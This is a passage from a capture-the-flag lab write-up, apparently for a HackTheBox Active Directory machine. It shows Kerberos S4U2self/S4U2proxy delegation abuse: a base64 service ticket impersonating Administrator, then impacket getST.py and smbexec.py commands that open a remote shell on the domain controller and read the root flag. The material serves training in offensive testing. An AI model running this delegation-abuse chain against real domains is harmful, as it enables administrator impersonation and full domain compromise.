[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
      Gw5kYy5zdXBwb3J0Lmh0Yg==
[+] Ticket successfully imported!
*Evil-WinRM* PS C:\Users\support\Desktop> klist

Current LogonId is 0:0x56996d

Cached Tickets: (1)

#0>	Client: Administrator @ SUPPORT.HTB
	Server: cifs/dc.support.htb @ SUPPORT.HTB
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
	Start Time: 8/19/2022 21:38:29 (local)
	End Time:   8/20/2022 7:38:29 (local)
	Renew Time: 8/26/2022 21:38:29 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0
	Kdc Called:
```

But we couldn't able get into the administrator. So tried this method

```shell
┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/exploit]
└─# python3 /usr/share/doc/python3-impacket/examples/getST.py  support.htb/fake02 -dc-ip dc.support.htb -impersonate administrator -spn cifs/dc.support.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache

┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/exploit]
└─# export KRB5CCNAME=administrator.ccache                                 
    
┌──(root㉿enum-more)-[~/…/support/results/10.10.11.174/exploit]
└─# python3 /usr/share/doc/python3-impacket/examples/smbexec.py support.htb/administrator@dc.support.htb -no-pass -k                                       
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Windows\system32

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
<Redacted>
```
